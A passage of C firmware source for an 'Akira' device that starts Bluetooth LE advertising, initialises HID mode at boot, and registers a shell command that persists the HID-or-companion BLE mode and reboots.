        BT_DATA_BYTES(BT_DATA_FLAGS, (BT_LE_AD_GENERAL | BT_LE_AD_NO_BREDR)),
    };

    /* Scan response: name + optional 128-bit service UUID */
    struct bt_data sd[2];
    uint8_t sd_count = 0;

    sd[sd_count++] = (struct bt_data)BT_DATA(
        BT_DATA_NAME_COMPLETE,
        bt_mgr.config.device_name,
        strlen(bt_mgr.config.device_name));

    if (svc_uuid128) {
        sd[sd_count++] = (struct bt_data)BT_DATA(
            BT_DATA_UUID128_ALL, svc_uuid128, 16);
    }

    int err = bt_le_adv_start(&adv_param, custom_ad, ARRAY_SIZE(custom_ad),
                               sd, sd_count);
    if (err == -EALREADY) {
        LOG_INF("BT already advertising");
        return 0;
    } else if (err) {
        LOG_ERR("Custom advertising start failed: %d", err);
        return err;
    }

    bt_mgr.state = BT_STATE_ADVERTISING;
    k_work_schedule(&bt_mgr.adv_slow_work, K_SECONDS(30));
    LOG_INF("BLE app advertising started (fast -> slow in 30 s)");
    return 0;
#else
    bt_mgr.state = BT_STATE_ADVERTISING;
    return 0;
#endif
}

#ifdef CONFIG_AKIRA_BT_HID
/* HID mode: eagerly initialise at boot so HID profile is ready immediately.
 * When the persisted boot mode selects the Companion service, HID must NOT
 * claim the radio here — otherwise the later companion SYS_INIT (prio 90) is
 * rejected with -EBUSY and the companion service never advertises. The BT stack
 * is then lazily initialised by the companion path (bt_manager_set_mode). */
static int bt_manager_sys_init(void)
{
    if (bt_manager_boot_mode_is_companion()) {
        LOG_INF("BT boot mode = companion; HID auto-init skipped");
        return 0;
    }
    bt_mgr.mode = BT_MODE_HID;
    bt_mgr.hid_active = true;
    return bt_manager_init(NULL);
}
SYS_INIT(bt_manager_sys_init, APPLICATION, CONFIG_AKIRA_BT_INIT_PRIORITY);
#endif

#if defined(CONFIG_SHELL) && defined(CONFIG_AKIRA_BT_COMPANION) && defined(CONFIG_AKIRA_SETTINGS)
/* `btmode [hid|companion]` — HID and the Companion service are mutually
 * exclusive on a single BLE connection, and switching cleanly means claiming
 * the radio from boot, so the setter persists the choice and cold-reboots. */
static int cmd_btmode(const struct shell *sh, size_t argc, char **argv)
{
    if (argc < 2) {
        char v[16] = "";
        int have = akira_settings_get(AKIRA_BT_MODE_KEY, v, sizeof(v));
        bt_manager_mode_t m = bt_manager_get_mode();
        shell_print(sh, "boot mode : %s", have == 0 && v[0] ? v : "hid (default)");
        shell_print(sh, "active    : %s",
                    m == BT_MODE_COMPANION ? "companion" :
                    m == BT_MODE_HID       ? "hid" :
                    m == BT_MODE_BLE_APP   ? "ble_app" :
                    m == BT_MODE_MESH      ? "mesh" : "none");
        shell_print(sh, "usage: btmode <hid|companion>  (persists + reboots)");
        return 0;
    }

    const char *mode = argv[1];
    if (strcmp(mode, "hid") != 0 && strcmp(mode, "companion") != 0) {
        shell_error(sh, "invalid mode '%s' (use: hid | companion)", mode);
        return -EINVAL;
    }

    int rc = akira_settings_set(AKIRA_BT_MODE_KEY, mode, 0);
    if (rc) {
        shell_error(sh, "failed to persist mode: %d", rc);
        return rc;
    }
    shell_print(sh, "BLE mode set to '%s' — rebooting to apply...", mode);
    k_sleep(K_MSEC(300));
    sys_reboot(SYS_REBOOT_COLD);
    return 0;
}
SHELL_CMD_REGISTER(btmode, NULL,
                   "Get/set boot BLE mode: btmode <hid|companion>", cmd_btmode);
#endif
